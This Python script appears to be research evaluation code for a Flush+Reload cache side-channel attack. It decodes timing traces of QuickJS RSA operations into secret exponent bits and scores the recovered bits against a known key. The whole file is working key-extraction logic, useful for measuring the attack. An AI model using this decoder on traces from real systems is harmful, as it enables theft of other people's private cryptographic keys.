
import argparse
import glob
import sys
from pathlib import Path

import numpy as np

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "evaluation"))

from extract_openpgp_rsa import RSA_KEY
from extract_openpgp_rsa import print_infer_stats
from utils import load_trace

attack_type = "FR"
hit_count_threshold_frac = 0.02


def windowed_inference(trace, n_bits, threshold_frac=None):
    if threshold_frac is None:
        threshold_frac = hit_count_threshold_frac

    pairs = np.array(trace[0].tolist(), dtype=np.int64)
    if pairs.shape[0] == 0:
        return ""
    tsc, lat = pairs[:, 0], pairs[:, 1]
    hit = (lat > 0) & (lat < 460)

    tsc_min, tsc_max = tsc.min(), tsc.max()
    duration = tsc_max - tsc_min
    if duration <= 0:
        return ""

    window_width = duration / n_bits
    window_idx = np.clip(((tsc - tsc_min) / window_width).astype(int), 0, n_bits - 1)

    samples_per_window = np.bincount(window_idx, minlength=n_bits)
    hits_per_window = np.bincount(window_idx, weights=hit.astype(np.int64), minlength=n_bits).astype(int)

    if samples_per_window.min() == 0:
        return ""

    hit_rate = hits_per_window / samples_per_window
    bits = "".join("1" if r > threshold_frac else "0" for r in hit_rate)
    return bits


def cluster_count(hit_tsc, thresh):
    if len(hit_tsc) == 0:
        return 0
    return 1 + int(np.sum(np.diff(hit_tsc) >= thresh))


def find_exact_cluster_threshold(hit_tsc, n_bits, lo=200_000, hi=320_000):
    if cluster_count(hit_tsc, lo) < n_bits or cluster_count(hit_tsc, hi) > n_bits:
        return None
    while lo < hi:
        mid = (lo + hi) // 2
        c = cluster_count(hit_tsc, mid)
        if c == n_bits:
            while cluster_count(hit_tsc, mid - 1) == n_bits:
                mid -= 1
            return mid
        elif c > n_bits:
            lo = mid + 1
        else:
            hi = mid
    return lo if cluster_count(hit_tsc, lo) == n_bits else None


def marker_windowed_inference(trace, n_bits, add_hit_threshold_frac=0.5):
    or_pairs = np.array(trace[1].tolist(), dtype=np.int64)
    add_pairs = np.array(trace[0].tolist(), dtype=np.int64)
    if or_pairs.shape[0] == 0 or add_pairs.shape[0] == 0:
        return ""

    or_tsc, or_lat = or_pairs[:, 0], or_pairs[:, 1]
    or_hit = np.sort(or_tsc[(or_lat > 0) & (or_lat < 300)])
    if len(or_hit) < n_bits:
        return ""

    thresh = find_exact_cluster_threshold(or_hit, n_bits)
    if thresh is None:
        return ""

    d = np.diff(or_hit)
    cluster_start_idx = np.concatenate(([0], np.where(d >= thresh)[0] + 1))
    cluster_end_idx = np.concatenate((cluster_start_idx[1:] - 1, [len(or_hit) - 1]))
    anchors = or_hit[cluster_end_idx]
    if len(anchors) != n_bits:
        return ""

    add_tsc, add_lat = add_pairs[:, 0], add_pairs[:, 1]
    add_hit = (add_lat > 0) & (add_lat < 460)
    edges = np.concatenate(([add_tsc.min() - 1], anchors))

    window_idx = np.searchsorted(edges, add_tsc, side="right") - 1
    valid = (window_idx >= 0) & (window_idx < n_bits)
    samples_per_window = np.bincount(window_idx[valid], minlength=n_bits)
    hits_per_window = np.bincount(
        window_idx[valid], weights=add_hit[valid].astype(np.int64), minlength=n_bits
    ).astype(int)

    if samples_per_window.min() == 0:
        return ""

    hit_rate = hits_per_window / samples_per_window
    bits = "".join("1" if r > add_hit_threshold_frac else "0" for r in hit_rate)
    return bits


def infer_directory(skey, output_dir, threshold_frac=None, use_marker=False):
    files = sorted(glob.glob(str(output_dir) + "/*.out"))
    for fp in files:
        trace = load_trace(fp)
        if use_marker:
            key = marker_windowed_inference(trace, skey.secret_key_bits)
        else:
            key = windowed_inference(trace, skey.secret_key_bits, threshold_frac)
        if len(key) == skey.secret_key_bits:
            skey.infer_keys.append(key)
    return len(files)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Extract secret RSA exponent bits from a quickjs_select_rsa_fr "
        "trace directory (windowed hit-count decoder, single-channel FR)"
    )
    parser.add_argument("-d", "--directory", required=True, help="Trace directory (one key's *.out files)")
    parser.add_argument("--id", type=int, default=0, help="RSA key ID (default 0)")
    parser.add_argument(
        "--threshold-frac",
        type=float,
        help="Hit-rate-per-window fraction above which a window is classified bit=1 "
        f"(default {hit_count_threshold_frac})",
    )
    parser.add_argument(
        "--marker",
        action="store_true",
        help="Use bf_logic_or cluster boundaries as per-iteration window edges "
        "(marker_windowed_inference) instead of naive equal-duration windows",
    )
    args = parser.parse_args()

    skey = RSA_KEY.load_key(args.id)
    print(f"key {args.id}: {skey.secret_key_bits} bits")

    n_traces = infer_directory(skey, args.directory, args.threshold_frac, args.marker)
    print(f"{n_traces} trace files in {args.directory}, "
          f"{len(skey.infer_keys)} usable ({len(skey.infer_keys)}/{n_traces})")

    skey.merge_inference()
    report = skey.check_accuracy()
    print(print_infer_stats(skey.kid, report))
